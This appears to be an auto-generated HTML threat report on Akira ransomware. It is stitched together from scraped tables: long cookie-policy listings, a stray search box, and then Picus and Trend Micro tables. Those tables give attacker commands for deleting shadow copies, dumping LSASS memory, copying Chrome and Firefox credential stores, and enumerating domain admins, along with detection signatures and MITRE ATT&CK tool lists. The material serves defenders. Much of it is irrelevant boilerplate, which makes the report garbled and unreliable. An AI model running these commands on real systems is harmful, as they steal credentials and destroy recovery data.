+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded, with the purpose of displaying targeted ads.
+                                    </td>
+</tr>
+<tr>
+<td>clid</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded, with the purpose of displaying targeted ads.
+                                    </td>
+</tr>
+<tr>
+<td>KRTBCOOKIE_#</td>
+<td>Registers a unique ID that identifies the user's device during return visits
+                                        across websites that use the same ad network. The ID is used to allow targeted
+                                        ads.
+                                    </td>
+</tr>
+<tr>
+<td>PUBMDCID</td>
+<td>Registers a unique ID that identifies the user's device during return visits
+                                        across websites that use the same ad network. The ID is used to allow targeted
+                                        ads.
+                                    </td>
+</tr>
+<tr>
+<td>PugT</td>
+<td>Registers a unique ID that identifies the user's device during return visits
+                                        across websites that use the same ad network. The ID is used to allow targeted
+                                        ads.
+                                    </td>
+</tr>
+<tr>
+<td>ssi</td>
+<td>Registers a unique ID that identifies a returning user's device. The ID is used
+                                        for targeted ads.
+                                    </td>
+</tr>
+<tr>
+<td>_tmid</td>
+<td>Registers a unique ID that identifies the user's device upon return visits. The
+                                        ID is used to target ads in video clips.
+                                    </td>
+</tr>
+<tr>
+<td>wam-sync</td>
+<td>Used by the advertising platform Weborama to determine the visitor's interests
+                                        based on pages visits, content clicked and other actions on the website.
+                                    </td>
+</tr>
+<tr>
+<td>wui</td>
+<td>Used by the advertising platform Weborama to determine the visitor's interests
+                                        based on pages visits, content clicked and other actions on the website.
+                                    </td>
+</tr>
+<tr>
+<td>AFFICHE_W</td>
+<td>Used by the advertising platform Weborama to determine the visitor's interests
+                                        based on pages visits, content clicked and other actions on the website.
+                                    </td>
+</tr>
+<tr>
+<td>B</td>
+<td>Collects anonymous data related to the user's website visits, such as the number
+                                        of visits, average time spent on the website and what pages have been loaded.
+                                        The registered data is used to categorise the users' interest and demographical
+                                        profiles with the purpose of customising the website content depending on the
+                                        visitor.
+                                    </td>
+</tr>
+<tr>
+<td>1P_JAR</td>
+<td>These cookies are used to gather website statistics, and track conversion
+                                        rates.
+                                    </td>
+</tr>
+<tr>
+<td>APISID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>HSID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>NID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>SAPISID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>SID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>SIDCC</td>
+<td>Security cookie to protect users data from unauthorised access.</td>
+</tr>
+<tr>
+<td>SSID</td>
+<td>Google set a number of cookies on any page that includes a Google reCAPTCHA.
+                                        While we have no control over the cookies set by Google, they appear to include
+                                        a mixture of pieces of information to measure the number and behaviour of Google
+                                        reCAPTCHA users.
+                                    </td>
+</tr>
+<tr>
+<td>__utmx</td>
+<td>This cookie is associated with Google Website Optimizer, a tool designed to help
+                                        site owners improve their wbesites. It is used to distinguish between two
+                                        varaitions a webpage that might be shown to a visitor as part of an A/B split
+                                        test. This helps site owners to detemine which version of a page performs
+                                        better, and therefore helps to improve the website.
+                                    </td>
+</tr>
+<tr>
+<td>__utmxx</td>
+<td>This cookie is associated with Google Website Optimizer, a tool designed to help
+                                        site owners improve their wbesites. It is used to distinguish between two
+                                        varaitions a webpage that might be shown to a visitor as part of an A/B split
+                                        test. This helps site owners to detemine which version of a page performs
+                                        better, and therefore helps to improve the website.
+                                    </td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/'>https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/</a></p><br><table class="cookie-table">
+<thead>
+<tr>
+<th>
+                                        Name
+                                    </th>
+<th>
+                                        Descripiton
+                                    </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>_hjid</td>
+<td>Hotjar cookie. This cookie is set when the customer first lands on a page with
+                                        the Hotjar script. It is used to persist the random user ID, unique to that site
+                                        on the browser. This ensures that behavior in subsequent visits to the same site
+                                        will be attributed to the same user ID.
+                                    </td>
+</tr>
+<tr>
+<td>_hjIncludedInSample</td>
+<td>This cookie is associated with web analytics functionality and services from Hot
+                                        Jar, a Malta based company. It uniquely identifies a visitor during a single
+                                        browser session and indicates they are included in an audience sample.
+                                    </td>
+</tr>
+<tr>
+<td>intercom-id-[xxx]</td>
+<td>This cookie is used by Intercom as a session so that users can continue a chat
+                                        as they move through the site.
+                                    </td>
+</tr>
+<tr>
+<td>intercom-session-[xxx]</td>
+<td>Used to keeping track of sessions and remember logins and conversations.</td>
+</tr>
+<tr>
+<td>demdex</td>
+<td>Via a unique ID that is used for semantic content analysis, the user's
+                                        navigation on the website is registered and linked to offline data from surveys
+                                        and similar registrations to display targeted ads.
+                                    </td>
+</tr>
+<tr>
+<td>CookieConsent</td>
+<td>Stores the user's cookie consent state for the current domain.</td>
+</tr>
+<tr>
+<td>__cfduid</td>
+<td>Used by the content network, Cloudflare, to identify trusted web traffic.</td>
+</tr>
+<tr>
+<td>ss</td>
+<td>These cookies enable the website to provide enhanced functionality and
+                                        personalisation . They may be set by us or by third party providers whose
+                                        services we have added to our pages.<br/>These services may include the Live Chat
+                                        facility, Contact Us form(s), the Product Quotation forms and submission
+                                        process, and the Email Newsletter sign up functionality .
+                                    </td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/'>https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/</a></p><br><table class="cookie-table">
+<thead>
+<tr>
+<th>
+                                        Name
+                                    </th>
+<th>
+                                        Descripiton
+                                    </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>_ga</td>
+<td>This cookie name is asssociated with Google Universal Analytics - which is a
+                                        significant update to Google's more commonly used analytics service. This cookie
+                                        is used to distinguish unique users by assigning a randomly generated number as
+                                        a client identifier. It is included in each page. Registers a unique ID that is
+                                        used to generate statistical data on how the visitor uses the website. request
+                                        in a site and used to calculate visitor, session and campaign data for the sites
+                                        analytics reports. By default it is set to expire after 2 years, although this
+                                        is customisable by website owners.
+                                    </td>
+</tr>
+<tr>
+<td>_gat</td>
+<td>Used by Google Analytics to throttle request rate. This cookie name is
+                                        associated with Google Universal Analytics, according to documentation it is
+                                        used to throttle the request rate - limiting the collection of data on high
+                                        traffic sites. It expires after 10 minutes.
+                                    </td>
+</tr>
+<tr>
+<td>_gid</td>
+<td>This cookie name is asssociated with Google Universal Analytics. This appears to
+                                        be a new cookie and as of Spring 2017 no information is available from Google.
+                                        It appears to store and update a unique value for each page visited. Registers a
+                                        unique ID that is used to generate statistical data on how the visitor uses the
+                                        website.
+                                    </td>
+</tr>
+<tr>
+<td>IDE</td>
+<td>Used by Google DoubleClick to register and report the website user's actions
+                                        after viewing or clicking one of the advertiser's ads with the purpose of
+                                        measuring the efficacy of an ad and to present targeted ads to the user.
+                                    </td>
+</tr>
+<tr>
+<td>r/collect</td>
+<td>Used by Google DoubleClick to register and report the website user's actions
+                                        after viewing or clicking one of the advertiser's ads with the purpose of
+                                        measuring the efficacy of an ad and to present targeted ads to the user.
+                                    </td>
+</tr>
+<tr>
+<td>test_cookie</td>
+<td>Used to check if the user's browser supports cookies.</td>
+</tr>
+<tr>
+<td>collect</td>
+<td>Used to send data to Google Analytics about the visitor's device and behaviour.
+                                        Tracks the visitor across devices and marketing channels.
+                                    </td>
+</tr>
+<tr>
+<td>ads/user-lists/#</td>
+<td>These cookies may be set through our site by our advertising partners. They may
+                                        be used by those companies to build a profile of your interests and show you
+                                        relevant adverts on other sites.
+                                    </td>
+</tr>
+<tr>
+<td>c</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+<tr>
+<td>khaos</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+<tr>
+<td>put_#</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+<tr>
+<td>rpb</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+<tr>
+<td>rpx</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+<tr>
+<td>tap.php</td>
+<td>Registers anonymised user data, such as IP address, geographical location,
+                                        visited websites, and what ads the user has clicked, with the purpose of
+                                        optimising ad display based on the user's movement on websites that use the same
+                                        ad network.
+                                    </td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/'>https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="background-color: #f0f0f0;">
+<p><span style="color: #444444; background-color: #f0f0f0;">powershell.exe -Command </span><span style="color: #880000; background-color: #f0f0f0;">"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="background-color: #f0f0f0;">
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//T1018 Remote System Discovery</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">nltest /dclist:&lt;domain_name&gt;</span></p>
+<br/>
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//T1057 Process Discovery</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">tasklist</span></p>
+<br/>
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//T1069 Permission Groups Discovery</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">net group “Domain admins” /domain</span></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">net localgroup “Administrators” /domain</span></p>
+<br/>
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//T1482 Domain Trust Discovery</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">nltest /domain_trusts</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="background-color: #f0f0f0;">
+<p><span style="color: #444444; background-color: #f0f0f0;">rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((</span><span style="color: #397300; background-color: #f0f0f0;">Get-Process</span><span style="color: #444444; background-color: #f0f0f0;"> lsass).Id) C:\Windows\temp\lsass.dmp full</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="background-color: #f0f0f0;">
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//Dumping credentials from Google Chrome</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">esentutl.exe /y “[Path_to_Chrome_Cred_Stores]\Login Data" /d "[Path_to_Chrome_Cred_Stores]\Login Data.tmp”</span></p>
+<br/>
+<p><strong><span style="color: #444444; background-color: #f0f0f0;">//Dumping credentials from Mozilla Firefox</span></strong></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">esentutl.exe /y “[Path_to_Firefox_Cred_Stores]\key4.db" /d</span></p>
+<p><span style="color: #444444; background-color: #f0f0f0;">“[Path_to_Firefox_Cred_Stores]\key4.db.tmp”</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="background-color: #f0f0f0;">
+<p><span style="color: #444444; background-color: #f0f0f0;">powershell.exe -Command </span><span style="color: #880000; background-color: #f0f0f0;">"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Threat ID</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Threat Name</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Attack Module</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>84668</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Akira Ransomware Download Threat</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Network Infiltration</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>55812</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Akira Ransomware Email Threat</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Email Infiltration (Phishing)</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>37780</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Megazord Ransomware Download Threat</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Network Infiltration</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>92400</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Megazord Ransomware Email Threat</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Email Infiltration (Phishing)</p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
+<tbody>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Security Control</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Signature ID</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p style="font-weight: bold;">Signature Name</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0D0FC5542</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.a77avEjG</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0CEDE557A</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.eec5NsKn</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0CFD4BD86</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.a5f8yZDg</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0E0BEF9A4</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.0e05wZMS</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0A2E01186</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.ea38rili</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Check Point NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0C5DE6DD1</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransomware.Win32.Akira.TC.4b33iwYh</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Cisco FirePower</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p> </p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>W32.Auto:3c92bf.in03.Talos</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Cisco FirePower</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p> </p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>W32.Auto:7b295a.in03.Talos</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Cisco FirePower</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p> </p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>W32.Auto:1b6af2.in03.Talos</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Cisco FirePower</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p> </p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>W32.Auto:678ec8.in03.Talos</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Forcepoint NGFW</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p> </p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>File_Malware-Blocked </p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Fortigate AV</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>10143171</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Linux/Filecoder_Akira.A!tr</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Fortigate AV</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>10133803</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>W64/Generik.NFLQ!tr.ransom</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Trellix</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>0x4840c900</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>MALWARE: Malicious File Detected by GTI</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Palo Alto</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>588177441</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>Ransom/Win32.akira.b</p>
+</td>
+</tr>
+<tr>
+<td style="border: 1pt solid #000000;">
+<p>Palo Alto</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>595008162</p>
+</td>
+<td style="border: 1pt solid #000000;">
+<p>ransomware/Linux.akira.d</p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a'>https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a</a></p><br><table class="tablepress tablepress-id-akira_ransomware" id="tablepress-akira_ransomware-no-2"><thead><tr class="row-1 odd"><th class="column-1"></th><th class="column-2">AKIRA RANSOMWARE SUMMARY</th></tr></thead><tbody><tr class="row-2 even"><td class="column-1"><strong>Name</strong></td><td class="column-2">Akira / Akira Ransomware</td></tr><tr class="row-3 odd"><td class="column-1"><strong>Danger Level</strong></td><td class="column-2">Very High. Military grade encryption, frequent data exfiltration attacks.</td></tr><tr class="row-4 even"><td class="column-1"><strong>Release date</strong></td><td class="column-2">2023</td></tr><tr class="row-5 odd"><td class="column-1"><strong>Affected Systems</strong></td><td class="column-2">Windows/Linux</td></tr><tr class="row-6 even"><td class="column-1"><strong>File Extensions</strong></td><td class="column-2">.akira</td></tr><tr class="row-7 odd"><td class="column-1"><strong>Ransom demands</strong></td><td class="column-2">"akira_readme.txt"</td></tr><tr class="row-8 even"><td class="column-1"><strong>Contact method/email</strong></td><td class="column-2">Through a hidden TOR web service</td></tr><tr class="row-9 odd"><td class="column-1"><strong>Known scammers</strong></td><td class="column-2">None</td></tr></tbody></table><br><br><p>Source: <a href='https://www.beforecrypt.com/en/akira-ransomware-removal-recovery/'>https://www.beforecrypt.com/en/akira-ransomware-removal-recovery/</a></p><br><table class="gsc-search-box">
+<tbody>
+<tr>
+<td class="gsc-input">
+<input autocomplete="off" class="gsc-input-field" name="search" placeholder="Search" title="search" type="text"/>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira'>https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira</a></p><br><table class="tableContentDarkTheme mitreTableStyle mce-item-table"><thead><tr><th>Initial Access</th><th>Persistence</th><th>Execution</th><th>Defense Evasion</th><th>Credential Access</th><th>Discovery</th><th>Command and Control</th><th>Lateral Movement</th><th>Exfiltration</th><th>Impact</th></tr></thead><tbody><tr><td><p><strong>T1078</strong> - Valid Accounts<br/><em>Uses compromised VPN credentialsl</em></p><p><strong>T1190</strong> - Exploit Public-Facing Application<br/><em>Targets vulnerable Cisco devices via CVE-2023-20269</em></p></td><td><p><strong>T1136.002</strong> - Create Account: Domain Account<br/><em>Once initial access is established, Akira operators will create a domain account on the compromised system </em></p></td><td><p><strong>T1059</strong> - Command and Scripting Interpreters<br/><em>Accepts parameters for its routines such as “-n 10” (for encryption percent) or “-s {filename}” (for shared folder encryption)</em></p></td><td><p><strong>T1562.001</strong> - Impair Defenses: Disable or Modify Tools<br/><em>It has been observed to use PowerTool or a KillAV tool that abuses Zemana AntiMalware driver to terminate AV-related processes</em></p></td><td><p><strong>T1003.001</strong> - OS Credential Dumping: LSASS Memory<br/><em>Uses Mimikatz, LaZagne, or a command line to dump LSASS from memory</em></p></td><td><p><strong>T1082</strong> - System Information Discovery<br/><em>Uses PCHunter and SharpHound to gather system information</em></p><p><strong>T1069.002</strong> - Permission Groups Discovery: Domain Groups<br/><em>Uses AdFind, net Windows command, and nltest to gather domain information </em></p><p><strong>T1018</strong> - Remote System Discovery<br/><em>Uses Advanced IP Scanner and MASSCAN to discover remote systems </em></p></td><td><p><strong>T1219</strong> - Remote Access Software<br/><em>May use either AnyDesk, Radmin, Cloudflare Tunnel, MobaXterm, RustDesk, or Ngrok to gain remote access on targeted systems</em></p></td><td><p><strong>T1570</strong> - Lateral Tool Transfer<br/><em>Uses RDP to move laterally within the victim’s network</em></p></td><td><p><strong>T1567.002</strong> - Exfiltration Over Web Service: Exfiltration to Cloud Storage<br/> <em>Uses RClone to exfiltrate stolen information over web service</em></p><p><strong>T1048.003</strong> - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol<br/> <em>Uses FileZilla or WinSCP to exfiltrate stolen information via FTP</em></p></td><td><p><strong>T1490</strong> - Inhibit System Recovery<br/> <em>Deletes shadow copies to inhibit recovery</em></p><p><strong>T1486</strong> - Data Encrypted for Impact<br/> <em>Akira ransomware is used to encrypt files</em></p></td></tr></tbody></table><br><br><p>Source: <a href='https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira'>https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira</a></p><br><table class="tableContentDarkTheme mitreTableStyle summaryToolsStyle mce-item-table"><thead><tr><th>Initial Access</th><th>Defense Evasion</th><th>Discovery</th><th>Credential Access</th><th>Command and Control</th><th>Lateral Movement</th><th>Exfiltration</th></tr></thead><tbody><tr><td><ul><li>VPN via compromised accounts</li></ul></td><td><ul><li>PowerTool</li></ul></td><td><ul><li>AdFind</li></ul></td><td><ul><li>Mimikatz</li></ul></td><td><ul><li>AnyDesk</li></ul></td><td><ul><li>RDP</li></ul></td><td><ul><li>WinSCP</li></ul></td></tr><tr><td><ul><li>CVE-2023-20269</li></ul></td><td><ul><li>KillAV (Terminator from GitHub)</li></ul></td><td><ul><li>PCHunter</li></ul></td><td><ul><li>LaZagne</li></ul></td><td><ul><li>Radmin</li></ul></td><td><ul></ul></td><td><ul><li>Rclone</li></ul></td></tr><tr><td></td><td><ul></ul></td><td><ul><li>Advanced IP Scanner</li></ul></td><td><ul><li>LSASS dump</li></ul></td><td><ul><li>Cloudflare Tunnel</li></ul></td><td><ul></ul></td><td><ul><li>FileZilla</li></ul></td></tr><tr><td><ul></ul></td><td><ul></ul></td><td><ul><li>SharpHound</li></ul></td><td><ul></ul></td><td><ul><li>MobaXterm</li></ul></td><td><ul></ul></td><td><ul></ul></td></tr><tr><td><ul></ul></td><td><ul></ul></td><td><ul><li>MASSCAN</li></ul></td><td><ul></ul></td><td><ul><li>RustDesk</li></ul></td><td><ul></ul></td><td><ul></ul></td></tr><tr><td><ul></ul></td><td><ul></ul></td><td><ul></ul></td><td><ul></ul></td><td><ul><li>ngrok</li></ul></td><td><ul></ul></td><td></td></tr></tbody></table><br><br><p>Source: <a href='https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira'>https://www.trendmicro.com/vinfo/au/security/news/ransomware-spotlight/ransomware-spotlight-akira</a></p><br>
+            </div>
+
+            <div class="footer">
+                <p>Generated by TITAN-X. For further details, refer to external resources.</p>
+            </div>
+        </body>
+    </html>
+    
